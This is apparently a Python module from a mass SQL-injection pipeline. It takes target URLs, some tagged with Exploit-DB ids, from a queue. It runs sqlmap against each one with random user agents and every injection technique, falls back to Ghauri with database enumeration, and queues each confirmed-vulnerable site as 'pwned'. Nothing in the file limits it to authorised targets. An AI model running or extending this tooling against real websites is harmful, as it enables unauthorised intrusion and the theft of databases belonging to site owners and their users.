import asyncio
import os
import sys
import re

# Add project root to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.config import (
    SQLMAP_LEVEL, SQLMAP_RISK, SQLMAP_SCAN_TIMEOUT,
    SQLMAP_CONCURRENT_SCANS, SQLMAP_DBMS,
    USE_GHAURI_FALLBACK, ASYNC_CONCURRENCY_LIMIT
)

def _build_sqlmap_args(url):
    args = [
        "-u", url,
        "--batch",
        "--random-agent",
        f"--level={SQLMAP_LEVEL}",
        f"--risk={SQLMAP_RISK}",
        "--timeout=10",
        "--threads=3",
        "--technique=BEUSTQ",
        "--fresh-queries",
    ]
    if SQLMAP_DBMS:
        args.append(f"--dbms={SQLMAP_DBMS}")
    return args

def _build_ghauri_args(url):
    return [
        "-u", url,
        "--batch",
        "--dbs"
    ]

class AsyncInjector:
    def __init__(self, in_q, out_q, stats=None):
        self.in_q = in_q
        self.out_q = out_q
        self.stats = stats
        self.vulnerable_count = 0
        self.semaphore = asyncio.Semaphore(SQLMAP_CONCURRENT_SCANS)

    async def scan_target(self, target_obj):
        url = target_obj["url"] if isinstance(target_obj, dict) else target_obj
        edb_id = target_obj.get("edb_id") if isinstance(target_obj, dict) else None

        async with self.semaphore:
            # print(f"[*] Testing: {url}")
            is_vulnerable = False
            dbms = SQLMAP_DBMS or "Unknown"

            try:
                # Always perform full SQLMap scan to confirm vulnerability
                # Even if we have an edb_id, we want to confirm access before counting as 'pwned'
                process = await asyncio.create_subprocess_exec(
                    "sqlmap", *_build_sqlmap_args(url),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                try:
                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=SQLMAP_SCAN_TIMEOUT)
                    stdout_str = stdout.decode('utf-8', errors='ignore')
                    if "is vulnerable" in stdout_str or "injectable" in stdout_str or "fetching" in stdout_str:
                        is_vulnerable = True
                        if not SQLMAP_DBMS:
                            match = re.search(r"back-end DBMS: ([\w\s]+)", stdout_str)
                            if match: dbms = match.group(1).strip()
                except asyncio.TimeoutExpired:
                    try:
                        process.kill()
                    except: pass
                    return

                # Ghauri fallback only if SQLMap fails to confirm
                if not is_vulnerable and USE_GHAURI_FALLBACK:
                    g_process = await asyncio.create_subprocess_exec(
                        "ghauri", *_build_ghauri_args(url),
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    try:
                        g_stdout, g_stderr = await asyncio.wait_for(g_process.communicate(), timeout=SQLMAP_SCAN_TIMEOUT)
                        g_stdout_str = g_stdout.decode('utf-8', errors='ignore').lower()
                        if "is vulnerable" in g_stdout_str or "injectable" in g_stdout_str or "current database" in g_stdout_str:
                            is_vulnerable = True
                            dbms = "Unknown (Ghauri)"
                    except asyncio.TimeoutExpired:
                        try:
                            g_process.kill()
                        except: pass

                if is_vulnerable:
                    self.vulnerable_count += 1
                    if self.stats:
                        self.stats.update(vulnerable=self.vulnerable_count)
                    
                    vuln_data = {"url": url, "dbms": dbms}
                    if isinstance(target_obj, dict):
                        vuln_data.update(target_obj)
                    vuln_data["dbms"] = dbms

                    await self.out_q.put(vuln_data)
                    # print(f"[+] VULNERABLE: {url} ({dbms})")

            except Exception:
                pass

    async def run(self):
        tasks = []
        while True:
            target = await self.in_q.get()
            if target is None:
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                if self.out_q:
                    await self.out_q.put(None)
                self.in_q.task_done()
                break
            
            task = asyncio.create_task(self.scan_target(target))
            tasks.append(task)
            
            if len(tasks) > 100:
                tasks = [t for t in tasks if not t.done()]
            
            self.in_q.task_done()

async def main(in_q, out_q, stats=None):
    injector = AsyncInjector(in_q, out_q, stats=stats)
    await injector.run()
